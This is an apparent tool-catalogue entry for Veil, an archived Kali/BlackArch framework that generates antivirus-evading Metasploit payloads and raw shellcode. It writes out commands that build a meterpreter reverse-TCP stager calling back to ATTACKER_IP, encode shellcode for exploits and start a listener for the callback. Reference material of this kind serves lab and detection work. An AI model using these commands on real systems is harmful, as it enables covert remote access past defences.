---
name: "veil"
categories:
  - blackarch-automation
version: "297.d8acd4c"
homepage: "https://github.com/Veil-Framework/Veil"
packaged-by: [blackarch, kali]
blackarch-builddate: "2026-01-14"
build-system: scripts
license: GPL2
meta-checked: "2026-11-09"
github-repo: "Veil-Framework/Veil"
github-stars: 4222
github-pushed: "2023-10-09"
github-archived: true
github-issues: 75
github-match: "exact"
gh-checked: "2026-11-07"
worth: 0.8
worth-basis: "historical (archived/gone upstream)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# veil

> Framework that generates AV-evading metasploit payloads (via Evasion) and raw shellcode (via Ordnance); upstream is archived.

## What it's for

Veil generates Metasploit-framework payloads wrapped in obfuscated loaders (Python, Go, C, AutoIT, …) with the goal of bypassing common antivirus detection at generation time. It bundles two tools: **Evasion**, which produces compiled executables plus their source and a matching Metasploit handler resource file, and **Ordnance**, which generates and encodes raw stager shellcode (e.g. reverse TCP) for use in your own exploits. Note the honest status: the upstream repository was archived in 2023, so the payload formats and evasion quality reflect that era — modern EDR will frequently catch them. It remains packaged in Kali/BlackArch and is still useful for lab work, detection-rule testing, and understanding classic evasion techniques.

## Typical use cases

### Generate an evading meterpreter payload from the CLI

```
sudo ./Veil.py -t Evasion -p go/meterpreter/rev_tcp.py --ip ATTACKER_IP --port 4444
```

Outcome: compiles a Go-based meterpreter reverse-TCP stager; writes the PE executable to `/var/lib/veil/output/compiled/payload.exe`, its source to `/var/lib/veil/output/source/`, and a Metasploit handler script to `/var/lib/veil/output/handlers/payload.rc` (run it with `msfconsole -r payload.rc` to catch the callback).

### List available payload modules

```
./Veil.py -t Evasion --list-payloads
```

Outcome: prints every Evasion payload module by language (python, go, c, autoit, …) so you can pick one for `-p` before generating.

### Generate raw shellcode with Ordnance

```
./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip ATTACKER_IP --port 4444
```

Outcome: prints the raw stager shellcode bytes (and its size) to the console, ready to embed into a custom exploit; combine with `--list-encoders`, `-e ENCODER`, `-b '\x00\x0a'` and `--print-stats` to encode it and strip bad characters.

### Work interactively from the main menu

```
sudo ./Veil.py
```

Outcome: opens the interactive console (`use Evasion` / `use Ordnance` to enter a tool, then pick payloads and set options interactively); `list`, `info` and `options` show tools and configuration.

*No corpus evidence — derived from upstream documentation.*
